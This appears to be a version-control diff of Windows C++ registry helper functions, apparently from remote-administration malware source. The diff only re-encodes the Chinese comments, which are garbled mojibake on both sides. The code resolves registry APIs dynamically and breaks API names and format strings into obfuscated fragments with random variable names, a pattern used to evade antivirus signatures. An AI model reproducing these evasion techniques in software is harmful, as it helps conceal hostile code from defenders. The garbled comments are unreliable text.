@@ -1,13 +1,13 @@
-//#include <windows.h>
+ï»¿//#include <windows.h>
 #include "StdAfx.h"
 //#include <afxwin.h>
-#include "../Declare.h"   //¶¯Ì¬µ÷ÓÃ¿âº¯Êı
-//È¥³ı×Ö·û´®ÀàĞÍÇ°ÃæµÄ¿Õ¸ñ
-#include "../Myfunction.h"  //×Ô¶¨Òåº¯Êı
+#include "../Declare.h"   //åŠ¨æ€è°ƒç”¨åº“å‡½æ•°
+//å»é™¤å­—ç¬¦ä¸²ç±»å‹å‰é¢çš„ç©ºæ ¼
+#include "../Myfunction.h"  //è‡ªå®šä¹‰å‡½æ•°
 
 extern Myfunction *pMyfunction;
 
-//ÉèÖÃ×¢²á±í¼ü¶ÁÈ¡µÄÈ¨ÏŞ(KEY_READ||KEY_WRITE||KEY_ALL_ACCESS)
+//è®¾ç½®æ³¨å†Œè¡¨é”®è¯»å–çš„æƒé™(KEY_READ||KEY_WRITE||KEY_ALL_ACCESS)
 int SetKeySecurityEx(HKEY MainKey,LPCTSTR SubKey,DWORD security)
 {
 	RegOpenKeyExAT pRegOpenKeyExA=(RegOpenKeyExAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),"RegOpenKeyExA");
@@ -63,27 +63,27 @@ int SetKeySecurityEx(HKEY MainKey,LPCTSTR SubKey,DWORD security)
 	return iResult;
 }
 
-//¶ÁÈ¡×¢²á±íµÄÖ¸¶¨¼üµÄÊı¾İ(Mode:0-¶Á¼üÖµÊı¾İ 1-ÄÁ¾Ù×Ó¼ü 2-ÄÁ¾ÙÖ¸¶¨¼üÏî 3-ÅĞ¶Ï¸Ã¼üÊÇ·ñ´æÔÚ)
+//è¯»å–æ³¨å†Œè¡¨çš„æŒ‡å®šé”®çš„æ•°æ®(Mode:0-è¯»é”®å€¼æ•°æ® 1-ç‰§ä¸¾å­é”® 2-ç‰§ä¸¾æŒ‡å®šé”®é¡¹ 3-åˆ¤æ–­è¯¥é”®æ˜¯å¦å­˜åœ¨)
 int ReadRegEx(HKEY MainKey,LPCTSTR SubKey,LPCTSTR Vname,DWORD Type,char *szData,LPBYTE szBytes,DWORD lbSize,int Mode)
 {
 	RegOpenKeyExAT pRegOpenKeyExA=(RegOpenKeyExAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),"RegOpenKeyExA");
 	
 	//////////////////////////////////////////////////////////
-	//°Ñ×Ö·û´®"%-24s %-15s %s \r\n"Á¬½ÓÆğÀ´£¨×Ö·û´®Á¬½Ó·¨£©
+	//æŠŠå­—ç¬¦ä¸²"%-24s %-15s %s \r\n"è¿æ¥èµ·æ¥ï¼ˆå­—ç¬¦ä¸²è¿æ¥æ³•ï¼‰
 	char *njOFO1="%-24s %-15", *yryCx2="s %s \r\n",*ddueK3=NULL;
 	ddueK3=new char[strlen(njOFO1)+strlen(yryCx2)+1];
-	strcpy(ddueK3,njOFO1);//°ÑnjOFO1ËùÖ¸ÓÉNULL½áÊøµÄ×Ö·û´®¸´ÖÆµ½ddueK3ËùÖ¸µÄÊı×éÖĞ
-	strcat(ddueK3,yryCx2);//°ÑyryCx2ËùÖ¸×Ö·û´®Ìí¼Óµ½ddueK3½áÎ²´¦(¸²¸Çdest½áÎ²´¦µÄ'\0')²¢Ìí¼Ó'\0'
-	//ÕâÑù¾ÍÊµÏÖÁËddueK3=njOFO1+yryCx2,°ÑnjOFO1ºÍyryCx2Á¬½ÓÆğÀ´ÁË
+	strcpy(ddueK3,njOFO1);//æŠŠnjOFO1æ‰€æŒ‡ç”±NULLç»“æŸçš„å­—ç¬¦ä¸²å¤åˆ¶åˆ°ddueK3æ‰€æŒ‡çš„æ•°ç»„ä¸­
+	strcat(ddueK3,yryCx2);//æŠŠyryCx2æ‰€æŒ‡å­—ç¬¦ä¸²æ·»åŠ åˆ°ddueK3ç»“å°¾å¤„(è¦†ç›–destç»“å°¾å¤„çš„'\0')å¹¶æ·»åŠ '\0'
+	//è¿™æ ·å°±å®ç°äº†ddueK3=njOFO1+yryCx2,æŠŠnjOFO1å’ŒyryCx2è¿æ¥èµ·æ¥äº†
 	//////////////////////////////////////////////////////////
 	
 	//////////////////////////////////////////////////////////
-	//°Ñ×Ö·û´®"%-24s %-15s \r\n"Á¬½ÓÆğÀ´£¨×Ö·û´®Á¬½Ó·¨£©
+	//æŠŠå­—ç¬¦ä¸²"%-24s %-15s \r\n"è¿æ¥èµ·æ¥ï¼ˆå­—ç¬¦ä¸²è¿æ¥æ³•ï¼‰
 	char *SAFTd1="%-24s %-", *TZwjC2="15s \r\n",*nNdzb3=NULL;
 	nNdzb3=new char[strlen(SAFTd1)+strlen(TZwjC2)+1];
-	strcpy(nNdzb3,SAFTd1);//°ÑSAFTd1ËùÖ¸ÓÉNULL½áÊøµÄ×Ö·û´®¸´ÖÆµ½nNdzb3ËùÖ¸µÄÊı×éÖĞ
-	strcat(nNdzb3,TZwjC2);//°ÑTZwjC2ËùÖ¸×Ö·û´®Ìí¼Óµ½nNdzb3½áÎ²´¦(¸²¸Çdest½áÎ²´¦µÄ'\0')²¢Ìí¼Ó'\0'
-	//ÕâÑù¾ÍÊµÏÖÁËnNdzb3=SAFTd1+TZwjC2,°ÑSAFTd1ºÍTZwjC2Á¬½ÓÆğÀ´ÁË
+	strcpy(nNdzb3,SAFTd1);//æŠŠSAFTd1æ‰€æŒ‡ç”±NULLç»“æŸçš„å­—ç¬¦ä¸²å¤åˆ¶åˆ°nNdzb3æ‰€æŒ‡çš„æ•°ç»„ä¸­
+	strcat(nNdzb3,TZwjC2);//æŠŠTZwjC2æ‰€æŒ‡å­—ç¬¦ä¸²æ·»åŠ åˆ°nNdzb3ç»“å°¾å¤„(è¦†ç›–destç»“å°¾å¤„çš„'\0')å¹¶æ·»åŠ '\0'
+	//è¿™æ ·å°±å®ç°äº†nNdzb3=SAFTd1+TZwjC2,æŠŠSAFTd1å’ŒTZwjC2è¿æ¥èµ·æ¥äº†
 	//////////////////////////////////////////////////////////
 	
 	HKEY   hKey;
@@ -206,7 +206,7 @@ int ReadRegEx(HKEY MainKey,LPCTSTR SubKey,LPCTSTR Vname,DWORD Type,char *szData,
 	return iResult;
 }
 
-//Ğ´×¢²á±íµÄÖ¸¶¨¼üµÄÊı¾İ(Mode:0-ĞÂ½¨¼üÊı¾İ 1-ÉèÖÃ¼üÊı¾İ 2-É¾³ıÖ¸¶¨¼ü 3-É¾³ıÖ¸¶¨¼üÏî)
+//å†™æ³¨å†Œè¡¨çš„æŒ‡å®šé”®çš„æ•°æ®(Mode:0-æ–°å»ºé”®æ•°æ® 1-è®¾ç½®é”®æ•°æ® 2-åˆ é™¤æŒ‡å®šé”® 3-åˆ é™¤æŒ‡å®šé”®é¡¹)
 int WriteRegEx(HKEY MainKey,LPCTSTR SubKey,LPCTSTR Vname,DWORD Type,char* szData,DWORD dwData,int Mode)
 {
 	char PrnsW[] = {'R','e','g','C','r','e','a','t','e','K','e','y','E','x','A','\0'};
